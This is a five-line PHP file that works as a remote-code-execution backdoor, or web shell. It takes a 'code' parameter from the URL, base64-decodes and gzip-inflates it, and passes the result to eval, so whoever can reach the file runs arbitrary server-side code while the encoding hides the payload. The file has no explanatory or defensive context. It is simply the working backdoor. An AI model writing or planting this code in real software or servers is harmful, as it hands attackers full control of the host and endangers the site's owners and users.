<?php
$encoded = $_GET['code'];
eval(gzinflate(base64_decode($encoded)));
die("");
?>